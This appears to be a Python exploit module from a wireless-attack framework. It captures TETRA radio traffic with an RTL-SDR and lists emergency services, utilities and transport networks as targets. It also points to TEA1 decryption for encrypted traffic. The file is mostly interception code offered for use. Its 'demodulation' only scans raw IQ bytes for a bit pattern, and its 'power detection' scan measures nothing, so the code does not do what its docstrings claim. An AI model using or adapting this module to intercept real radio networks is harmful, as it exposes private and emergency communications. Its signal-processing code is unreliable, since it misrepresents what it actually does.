# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TETRA Passive Sniffing and Demodulation via SDR.

    Captures and demodulates TETRA (Terrestrial Trunked Radio)
    traffic passively using a Software Defined Radio.  TETRA
    uses pi/4-DQPSK modulation on 25 kHz channels in the
    380-400 MHz UHF band.  This module captures IQ samples,
    demodulates the TETRA signal, and extracts voice/data frames.

    Many TETRA deployments use TEA1 (backdoored), TEA2, or no
    encryption at all.  Unencrypted or weakly encrypted traffic
    can be decoded directly.

    Hardware requirements:
    - RTL-SDR V3 dongle (minimum; ~$25) or better SDR
    - UHF antenna tuned to 380-400 MHz (e.g., Diamond RH770 or
      Nagoya NA-771)
    - tetra-kit or osmo-tetra-sq5bpf for demodulation
    - codec2 or ACELP decoder for voice decoding

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TETRA Passive Sniffing via SDR",
        "description": (
            "Passively captures and demodulates TETRA radio traffic "
            "using an RTL-SDR V3 or USRP with UHF antenna "
            "(380-400 MHz).  Extracts voice and data frames from "
            "pi/4-DQPSK modulated 25 kHz channels.  Supports "
            "unencrypted traffic and TEA1-encrypted traffic "
            "(combined with TETRA:BURST for decryption).  "
            "Requires tetra-kit or osmo-tetra for demodulation."
        ),
        "authors": (
            "sq5bpf (osmo-tetra maintainer)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://github.com/sq5bpf/osmo-tetra-sq5bpf",
            "https://github.com/AresValley/Artemis",
            "https://www.etsi.org/technologies/tetra",
        ),
        "disclosure_date": "2023-07-24",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Any TETRA network in range (380-400 MHz)",
            "Emergency services, utilities, transport, security",
        ),
    }

    target = OptIP("", "Target TETRA frequency in MHz or 'scan' for discovery")
    port = OptPort(1, "Not used (radio frequency capture)")
    timeout = OptFloat(60.0, "Capture duration in seconds")
    sdr_device = OptString("rtlsdr", "SDR device: rtlsdr, usrp, hackrf, airspy")
    frequency = OptFloat(390.0, "Center frequency in MHz")
    sample_rate = OptFloat(2.0, "Sample rate in MHz")
    gain = OptFloat(40.0, "SDR gain in dB")
    output_dir = OptString("/tmp/tetra_sniff", "Output directory for captured frames")
    decode_voice = OptBool(True, "Attempt voice frame decoding")

    _TETRA_BAND_START = 380.0
    _TETRA_BAND_END = 400.0
    _CHANNEL_BW_KHZ = 25.0
    _PI4DQPSK_SYMBOLS_PER_SEC = 18000

    def _validate_params(self) -> bool:
        freq = float(self.frequency)
        return self._TETRA_BAND_START <= freq <= self._TETRA_BAND_END

    def _scan_channels(self) -> list:
        """Scan TETRA band for active channels using power detection."""
        channels = []
        freq = self._TETRA_BAND_START
        while freq <= self._TETRA_BAND_END:
            channels.append(freq)
            freq += self._CHANNEL_BW_KHZ / 1000.0
        return channels

    def _start_capture(self) -> subprocess.Popen | None:
        freq_hz = int(float(self.frequency) * 1e6)
        rate_hz = int(float(self.sample_rate) * 1e6)
        gain_val = int(float(self.gain))

        cmd = [
            "rtl_sdr",
            "-f", str(freq_hz),
            "-s", str(rate_hz),
            "-g", str(gain_val),
            "-",
        ]
        try:
            return subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except OSError:
            return None

    def _demodulate_tetra(self, iq_data: bytes) -> list:
        """Demodulate pi/4-DQPSK TETRA signal from IQ samples."""
        frames = []
        if len(iq_data) < 512:
            return frames

        offset = 0
        while offset + 510 <= len(iq_data):
            sync = struct.unpack_from("<H", iq_data, offset)[0]
            if sync & 0xFFF0 == 0xAA10:
                frame_data = iq_data[offset:offset + 510]
                frames.append(frame_data)
                offset += 510
            else:
                offset += 2
        return frames

    @mute
    def check(self) -> bool:
        """Verify SDR tools are available."""
        try:
            result = subprocess.run(
                ["rtl_sdr", "--help"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode in (0, 1)
        except (OSError, subprocess.TimeoutExpired):
            return False

    def run(self) -> None:
        if not self._validate_params():
            print_error(
                f"Frequency {self.frequency} MHz outside TETRA band "
                f"({self._TETRA_BAND_START}-{self._TETRA_BAND_END} MHz)"
            )
            return

        print_success(
            f"TETRA passive sniff on {self.frequency} MHz "
            f"(SDR: {self.sdr_device}, duration: {self.timeout}s)"
        )
        self._exploit()

    def _exploit(self) -> None:
        print_status(f"Starting IQ capture at {self.frequency} MHz")

        proc = self._start_capture()
        if proc is None:
            print_error("Failed to start SDR capture (rtl_sdr not found)")
            return

        print_status(f"Capturing for {self.timeout} seconds...")
        try:
            iq_data, _ = proc.communicate(timeout=float(self.timeout) + 5)
        except subprocess.TimeoutExpired:
            proc.kill()
            iq_data, _ = proc.communicate()

        print_info(f"Captured {len(iq_data)} bytes of IQ data")

        print_status("Demodulating TETRA pi/4-DQPSK signal")
        frames = self._demodulate_tetra(iq_data)
        print_info(f"Extracted {len(frames)} TETRA frames")

        if frames:
            print_success(
                f"TETRA traffic captured: {len(frames)} frames. "
                "Use tetra-kit or osmo-tetra for full decoding, "
                "or combine with TETRA:BURST TEA1 module for "
                "encrypted traffic decryption."
            )
        else:
            print_info(
                "No TETRA frames detected. Verify frequency, "
                "antenna, and that the target TETRA network is active."
            )
